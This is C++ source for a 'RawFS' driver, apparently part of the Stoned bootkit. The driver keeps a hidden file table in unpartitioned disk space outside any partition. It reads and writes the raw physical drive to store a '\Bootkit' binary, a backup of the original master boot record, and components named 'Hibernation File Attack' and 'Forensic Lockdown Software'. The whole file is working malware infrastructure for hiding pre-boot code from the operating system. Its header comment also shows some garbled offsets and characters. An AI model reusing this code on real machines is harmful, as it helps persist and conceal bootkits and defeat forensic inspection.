
// RawFS driver
//  - sector sized
//  - contains 8 entries for hard drives, 32 for CDs
//  - each entry has the format
//
//        + 0   8 bytes     Sector number of the file
//        + 8   8 bytes     Size in bytes of the file, multiple of 512
//        + 8   8 bytes     Real size of the file
//        + 8   8 bytes     Reserverd for future attributes
//        + 32  32 chars    32-byte MD5 hash of the file name
//        -------------------------------------------------------------
//              64 bytes per entry
//
//  - special entries (fixed md5 of the names)
//
//        B05B32A085DEFC9F4299C35AC8F358CD    \File Table                 Next block of File Table
//        8F58EADD7BFFF0C557D4B5E9656957A5    \Bootkit                    Bootkit binary
//        0F13C73AAB0D4E000028038C99D3125A    \Master Boot Record.bak     Original MBR
//        �                                   \�                          All other files

// - RawFS_CheckVolumeExists
// - RawFS_GetFileInfo
// - RawFS_ReadFile
// - RawFS_WriteFile
// - RawFS_DeleteFile
// - RawFS_FormatVolume
// - RawFS_EnumerateFiles
// - RawFS_RemoveVolume

// (C) 2009 Insecurity Systems InSec e.U., written by Peter Kleissner


#include "windows.h"
#include "Error.h"

struct FileTableEntry
{
    LARGE_INTEGER SectorNumber;
    LARGE_INTEGER Size;
    LARGE_INTEGER OccupiedSize;
    BYTE Reserved[8];
    char MD5[32];
};

// RawFS files
#define MD5_RawFS           "dec7f9619477b0ab1591aab2cc632364"      // RawFS
#define MD5_FreeFile        "9154b3b4030a02138ed9f2e7f58f29fa"      // \Free File
#define MD5_FileTable       "b05b32a085defc9f4299c35ac8f358cd"      // \File Table

// Stoned files
#define MD5_Bootkit         "8f58eadd7bfff0c557d4b5e9656957a5"      // \Bootkit
#define MD5_Bootloader      "ddcad6ec9127c41872ee0d0e0df14883"      // \Bootloader
#define MD5_MBR_Backup      "0F13C73AAB0D4E000028038C99D3125A"      // \Master Boot Record.bak
#define MD5_FLS             "fde793a0d624fb992d846ed743139e1d"      // \Stoned\Applications\Forensic Lockdown Software
#define MD5_HFA             "f6e6027fa3b8f5f85809708a28f98f32"      // \Stoned\Applications\Hibernation File Attack
#define MD5_Cmd             "15137ef73def24f4f00239628a70df43"      // \Stoned\Drivers\Cmd.sys
#define MD5_ExeLoader       "9d02867239b96bff7d5e78a234aa4955"      // \Stoned\Drivers\Exe Loader.sys


/* checks if a RawFS volume exists on the specified drive
    return codes:   Error_Windows        = Unknown Windows error
                    RawFS_Not_Bootable   = not a bootable disk
                    RawFS_Not_Installed  = RawFS not installed
                    RawFS_Successful     = RawFS installed
*/

int RawFS_CheckVolumeExists(HANDLE PhysicalDrive, DWORD & StartSector)
{
    // first read the Partition Table
    BYTE PartitionTable[512];
    DWORD NumberOfBytesRead;
    if (SetFilePointer(PhysicalDrive, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER     ||
        !ReadFile(PhysicalDrive, PartitionTable, 512, &NumberOfBytesRead, NULL) )
        return Error_Windows;

    // check if it is a valid bootable disk (through the boot signature 55h AAh)
    if (*((WORD *)PartitionTable + 510/2) != 0xAA55)
        return RawFS_Not_Bootable;

    // calculate the first sector of the RawFS volume
    DWORD FreeSector = 0;
    for (int n = 0; n < 4; n++)
    {
        if (FreeSector < *(DWORD *)((BYTE *)PartitionTable + 0x1BE + n*16 + 8) + *(DWORD *)((BYTE *)PartitionTable + 0x1BE + n*16 + 12))
            FreeSector = *(DWORD *)((BYTE *)PartitionTable + 0x1BE + n*16 + 8) + *(DWORD *)((BYTE *)PartitionTable + 0x1BE + n*16 + 12);
    }
    if (!FreeSector)
        return RawFS_Not_Bootable;
    StartSector = FreeSector;

    // read the first entry of the File Table
    FileTableEntry FileTable1[8];
	LARGE_INTEGER UnpartitionedSpace;
	UnpartitionedSpace.QuadPart = FreeSector;
	UnpartitionedSpace.QuadPart *= 512;

    if (!SetFilePointerEx(PhysicalDrive, UnpartitionedSpace, NULL, FILE_BEGIN)  ||
        !ReadFile(PhysicalDrive, FileTable1, 512, &NumberOfBytesRead, NULL) )
        return Error_Windows;

    if (_strnicmp(FileTable1[0].MD5, MD5_RawFS, 32) != 0  &&        // RawFS (MD5)
        _strnicmp(FileTable1[1].MD5, MD5_Bootkit, 32) != 0  )       // \Bootkit (MD5)
        return RawFS_Not_Installed;

    return RawFS_Successful;
}


/* returns file information
    return codes:   Error_Windows        = Unknown Windows error
                    RawFS_Successful     = File found, returned information valid
                    RawFS_File_Not_Found = File not found
*/

int RawFS_GetFileInfo(HANDLE PhysicalDrive, DWORD StartSector, char * FileName, DWORD & FileSize)
{
    FileTableEntry FileTable[8];
    DWORD NextFileTable = StartSector;
    do
    {
        // read the next File Table
        DWORD NumberOfBytesRead;
    	LARGE_INTEGER PositionFileTable;
    	PositionFileTable.QuadPart = NextFileTable;
    	PositionFileTable.QuadPart *= 512;
        if (!SetFilePointerEx(PhysicalDrive, PositionFileTable, NULL, FILE_BEGIN)  ||
            !ReadFile(PhysicalDrive, FileTable, 512, &NumberOfBytesRead, NULL) )
            return Error_Windows;
        NextFileTable = 0;

        // parse it!
        for (int n = 0; n < 8; n++)
        {
            if (!FileTable[n].SectorNumber.QuadPart)
                return RawFS_File_Not_Found;

            // File Table?
            if (_strnicmp(FileTable[n].MD5, MD5_FileTable, 32) == 0)
                NextFileTable = StartSector + FileTable[n].SectorNumber.LowPart;

            // searched file?
            if (_strnicmp(FileTable[n].MD5, FileName, 32) == 0)
            {
                FileSize = FileTable[n].OccupiedSize.LowPart;
                return RawFS_Successful;
            }
        }
    } while (NextFileTable);

    return RawFS_File_Not_Found;
}


/* reads a file
    return codes:   Error_Windows        = Unknown Windows error
                    RawFS_Successful     = File found, returned information valid
                    RawFS_File_Not_Found = File not found
*/

int RawFS_ReadFile(HANDLE PhysicalDrive, DWORD StartSector, char * FileName, BYTE *& Buffer,  DWORD & FileSize)
{
    FileTableEntry FileTable[8];
    DWORD NextFileTable = StartSector;
    do
    {
        // read the next File Table
        DWORD NumberOfBytesRead;
    	LARGE_INTEGER PositionFileTable;
    	PositionFileTable.QuadPart = NextFileTable;
    	PositionFileTable.QuadPart *= 512;
        if (!SetFilePointerEx(PhysicalDrive, PositionFileTable, NULL, FILE_BEGIN)  ||
            !ReadFile(PhysicalDrive, FileTable, 512, &NumberOfBytesRead, NULL) )
            return Error_Windows;
        NextFileTable = 0;

        // parse it!
        for (int n = 0; n < 8; n++)
        {
            if (!FileTable[n].SectorNumber.QuadPart)
                return RawFS_File_Not_Found;

            // File Table?
            if (_strnicmp(FileTable[n].MD5, MD5_FileTable, 32) == 0)
                NextFileTable = StartSector + FileTable[n].SectorNumber.LowPart;

            // searched file?
            if (_strnicmp(FileTable[n].MD5, FileName, 32) == 0)
            {
                FileSize = FileTable[n].OccupiedSize.LowPart;
                if ((Buffer = (BYTE *)VirtualAlloc(NULL, (FileTable[n].Size.LowPart + 511) & 0xFFFFFE00, MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE)) == NULL)
                    return Error_Windows;

                LARGE_INTEGER PositionFile;
                PositionFile.QuadPart = FileTable[n].SectorNumber.QuadPart + StartSector;
                PositionFile.QuadPart *= 512;
                if (!SetFilePointerEx(PhysicalDrive, PositionFile, NULL, FILE_BEGIN)  ||
                    !ReadFile(PhysicalDrive, Buffer, (FileTable[n].Size.LowPart + 511) & 0xFFFFFE00, &NumberOfBytesRead, NULL) )
                    return Error_Windows;
                return RawFS_Successful;
            }
        }
    } while (NextFileTable);

    return RawFS_File_Not_Found;
}


/* writes a file
    return codes:   Error_Windows        = Unknown Windows error
                    RawFS_Successful     = Written successfully
                    RawFS_Corrupt_Volume = Corrupt RawFS
*/

int RawFS_WriteFile(HANDLE PhysicalDrive, DWORD StartSector, char * FileName, BYTE * Buffer,  DWORD FileSize)
{
    FileTableEntry FileTable[8];
    LARGE_INTEGER PositionFile;

    DWORD NextFileTable = StartSector;
    DWORD NextFreeSector = 1;

    do
    {
        // read the next File Table
        DWORD NumberOfBytesRead;
    	LARGE_INTEGER PositionFileTable;
    	PositionFileTable.QuadPart = NextFileTable;
    	PositionFileTable.QuadPart *= 512;
        if (!SetFilePointerEx(PhysicalDrive, PositionFileTable, NULL, FILE_BEGIN)  ||
            !ReadFile(PhysicalDrive, FileTable, 512, &NumberOfBytesRead, NULL) )
            return Error_Windows;
        NextFileTable = 0;

        // parse it!
        for (int n = 0; n < 8; n++)
        {
            // last entry?
            if (!FileTable[n].SectorNumber.QuadPart)
            {
                // create new File Table?
                if (n == 7)
                {
                    memset((void *)&FileTable[n], 0, 64);
                    memcpy(FileTable[n].MD5, MD5_FileTable, 32);
                    FileTable[n].SectorNumber.LowPart = NextFreeSector;
                    FileTable[n].Size.LowPart = 512;
                    FileTable[n].OccupiedSize.LowPart = 512;
                    NextFreeSector++;

                    // update the File Table
                    if (!SetFilePointerEx(PhysicalDrive, PositionFileTable, NULL, FILE_BEGIN)  ||
                        !WriteFile(PhysicalDrive, FileTable, 512, &NumberOfBytesRead, NULL) )
                        return Error_Windows;

                    // seek to the File Table
                    PositionFileTable.LowPart = NextFreeSector;
                    memset(FileTable, 0, 512);
                    n = 0;
                }

                // otherwise directly write the new file
                memset((void *)&FileTable[n], 0, 64);
                memcpy(FileTable[n].MD5, FileName, 32);
                FileTable[n].SectorNumber.LowPart = NextFreeSector;
                FileTable[n].Size.LowPart = (FileSize + 511) & 0xFFFFFE00;
                FileTable[n].OccupiedSize.LowPart = FileSize;

                // update the File Table
                if (!SetFilePointerEx(PhysicalDrive, PositionFileTable, NULL, FILE_BEGIN)  ||
                    !WriteFile(PhysicalDrive, FileTable, 512, &NumberOfBytesRead, NULL) )
                    return Error_Windows;

                // write it
                PositionFile.QuadPart = FileTable[n].SectorNumber.QuadPart + StartSector;
                PositionFile.QuadPart *= 512;
                if (!SetFilePointerEx(PhysicalDrive, PositionFile, NULL, FILE_BEGIN)  ||
                    !WriteFile(PhysicalDrive, Buffer, (FileTable[n].Size.LowPart + 511) & 0xFFFFFE00, &NumberOfBytesRead, NULL) )
                    return Error_Windows;
                return RawFS_Successful;
            }

            NextFreeSector = FileTable[n].SectorNumber.LowPart + FileTable[n].Size.LowPart / 512;

            // File Table?
            if (_strnicmp(FileTable[n].MD5, MD5_FileTable, 32) == 0)
                NextFileTable = FileTable[n].SectorNumber.LowPart + StartSector;

            // searched file?
            if (_strnicmp(FileTable[n].MD5, FileName, 32) == 0)
            {
                // free the file if it is not big enough
                if (FileTable[n].Size.LowPart < FileSize)
                {
                    // update the File Table
                    memcpy(FileTable[n].MD5, MD5_FreeFile, 32);
                    if (!SetFilePointerEx(PhysicalDrive, PositionFileTable, NULL, FILE_BEGIN)  ||
                        !WriteFile(PhysicalDrive, FileTable, 512, &NumberOfBytesRead, NULL) )
                        return Error_Windows;

                    // and write it new on the end of run
                    continue;
                }

                // update the File Table if necessary
                if (FileTable[n].OccupiedSize.LowPart != FileSize)
                {
                    FileTable[n].OccupiedSize.LowPart = FileSize;
                    if (!SetFilePointerEx(PhysicalDrive, PositionFileTable, NULL, FILE_BEGIN)  ||
                        !WriteFile(PhysicalDrive, FileTable, 512, &NumberOfBytesRead, NULL) )
                        return Error_Windows;
                }

                // otherwise just overwrite it
                PositionFile.QuadPart = FileTable[n].SectorNumber.QuadPart + StartSector;
                PositionFile.QuadPart *= 512;
                if (!SetFilePointerEx(PhysicalDrive, PositionFile, NULL, FILE_BEGIN)  ||
                    !WriteFile(PhysicalDrive, Buffer, FileTable[n].Size.LowPart, &NumberOfBytesRead, NULL) )
                    return Error_Windows;
                return RawFS_Successful;
            }
        }
    } while (NextFileTable);

    return RawFS_Corrupt_Volume;
}


/* formats a volume with RawFS and creates the initial entry
    return codes:   Error_Windows        = Unknown Windows error
                    RawFS_Successful     = Formatted successfully
*/

int RawFS_FormatVolume(HANDLE PhysicalDrive, DWORD StartSector)
{
    // create the first File Table
	LARGE_INTEGER UnpartitionedSpace;
	UnpartitionedSpace.QuadPart = StartSector;
	UnpartitionedSpace.QuadPart *= 512;
    FileTableEntry FileTable1[8];
    memset(FileTable1, 0, sizeof(FileTable1));

    // protection entry for master boot record backup
    FileTable1[0].SectorNumber.QuadPart = 1;
    FileTable1[0].Size.LowPart = 512;
    memcpy(FileTable1[0].MD5, MD5_MBR_Backup, 32);  // MD5 \Master Boot Record.bak

    // protection entry for bootkit
    FileTable1[1].SectorNumber.QuadPart = 2;
    FileTable1[1].Size.LowPart = 32*1024;
    memcpy(FileTable1[1].MD5, MD5_Bootkit, 32);     // MD5 \Bootkit

    // write it
    DWORD NumberOfBytesWritten;
    if (!SetFilePointerEx(PhysicalDrive, UnpartitionedSpace, NULL, FILE_BEGIN)  ||
        !WriteFile(PhysicalDrive, FileTable1, 512, &NumberOfBytesWritten, NULL) )
        return Error_Windows;

    return RawFS_Successful;
}


/* deletes a file
    return codes:   Error_Windows        = Unknown Windows error
                    RawFS_Successful     = Deleted successfully
                    RawFS_Corrupt_Volume = Corrupt RawFS
                    RawFS_File_Not_Found = File not found
*/

int RawFS_DeleteFile(HANDLE PhysicalDrive, DWORD StartSector, char * FileName)
{
    FileTableEntry FileTable[8];
    DWORD NextFileTable = StartSector;

    do
    {
        // read the next File Table
        DWORD NumberOfBytesRead;
    	LARGE_INTEGER PositionFileTable;
    	PositionFileTable.QuadPart = NextFileTable;
    	PositionFileTable.QuadPart *= 512;
        if (!SetFilePointerEx(PhysicalDrive, PositionFileTable, NULL, FILE_BEGIN)  ||
            !ReadFile(PhysicalDrive, FileTable, 512, &NumberOfBytesRead, NULL) )
            return Error_Windows;
        NextFileTable = 0;

        for (int n = 0; n < 8; n++)
        {
            if (!FileTable[n].SectorNumber.QuadPart)
                return RawFS_File_Not_Found;

            if (_strnicmp(FileTable[n].MD5, MD5_FileTable, 32) == 0)
                NextFileTable = FileTable[n].SectorNumber.LowPart + StartSector;

            if (_strnicmp(FileTable[n].MD5, FileName, 32) == 0)
            {
                memcpy(FileTable[n].MD5, MD5_FreeFile, 32);
                if (!SetFilePointerEx(PhysicalDrive, PositionFileTable, NULL, FILE_BEGIN)  ||
                    !WriteFile(PhysicalDrive, FileTable, 512, &NumberOfBytesRead, NULL) )
                    return Error_Windows;

                return RawFS_Successful;
            }
        }
    } while (NextFileTable);

    return RawFS_Corrupt_Volume;
}


/* enumerates all RawFS files
    return codes:   Error_Windows        = Unknown Windows error
                    RawFS_Successful     = Files enumerated, returned information valid
                    RawFS_File_Not_Found = File not found
*/

int RawFS_EnumerateFiles(HANDLE PhysicalDrive, DWORD StartSector, void (*Callback)(char * FileName, DWORD Size))
{
    FileTableEntry FileTable[8];
    DWORD NextFileTable = StartSector;
    do
    {
        // read the next File Table
        DWORD NumberOfBytesRead;
    	LARGE_INTEGER PositionFileTable;
    	PositionFileTable.QuadPart = NextFileTable;
    	PositionFileTable.QuadPart *= 512;
        if (!SetFilePointerEx(PhysicalDrive, PositionFileTable, NULL, FILE_BEGIN)  ||
            !ReadFile(PhysicalDrive, FileTable, 512, &NumberOfBytesRead, NULL) )
            return Error_Windows;
        NextFileTable = 0;

        // parse it!
        for (int n = 0; n < 8; n++)
        {
            if (!FileTable[n].SectorNumber.QuadPart)
                return RawFS_Successful;

            // File Table?
            if (_strnicmp(FileTable[n].MD5, MD5_FileTable, 32) == 0)
                NextFileTable = StartSector + FileTable[n].SectorNumber.LowPart;

            // translate the file name to something human readable
            char * FileName = FileTable[n].MD5;
            if (_strnicmp(FileTable[n].MD5, MD5_RawFS, 32) == 0)            FileName = "RawFS";             // RawFS specific files
            if (_strnicmp(FileTable[n].MD5, MD5_FreeFile, 32) == 0)         FileName = "\\Free File";
            if (_strnicmp(FileTable[n].MD5, MD5_FileTable, 32) == 0)        FileName = "\\File Table";
            if (_strnicmp(FileTable[n].MD5, MD5_Bootkit, 32) == 0)          FileName = "\\Bootkit";         // Stoned specific files
            if (_strnicmp(FileTable[n].MD5, MD5_MBR_Backup, 32) == 0)       FileName = "\\Master Boot Record.bak";
            if (_strnicmp(FileTable[n].MD5, MD5_FLS, 32) == 0)              FileName = "\\Stoned\\Applications\\Forensic Lockdown Software";
            if (_strnicmp(FileTable[n].MD5, MD5_HFA, 32) == 0)              FileName = "\\Stoned\\Applications\\Hibernation File Attack";
            if (_strnicmp(FileTable[n].MD5, MD5_Cmd, 32) == 0)              FileName = "\\Stoned\\Drivers\\Cmd.sys";
            if (_strnicmp(FileTable[n].MD5, MD5_ExeLoader, 32) == 0)        FileName = "\\Stoned\\Drivers\\Exe Loader.sys";

            // call the callback
            Callback(FileName, FileTable[n].Size.LowPart);

        }
    } while (NextFileTable);

    return RawFS_Successful;
}


/* removes a RawFS volume
    return codes:   Error_Windows        = Unknown Windows error
                    RawFS_Successful     = Formatted successfully
*/

int RawFS_RemoveVolume(HANDLE PhysicalDrive, DWORD StartSector)
{
    // create the first File Table
	LARGE_INTEGER UnpartitionedSpace;
	UnpartitionedSpace.QuadPart = StartSector;
	UnpartitionedSpace.QuadPart *= 512;
    BYTE EmptySector[512];
    memset(EmptySector, 0, sizeof(EmptySector));

    // remove the RawFS volume by overwriting the first FileTable
    DWORD NumberOfBytesWritten;
    if (!SetFilePointerEx(PhysicalDrive, UnpartitionedSpace, NULL, FILE_BEGIN)  ||
        !WriteFile(PhysicalDrive, EmptySector, 512, &NumberOfBytesWritten, NULL) )
        return Error_Windows;

    return RawFS_Successful;
}
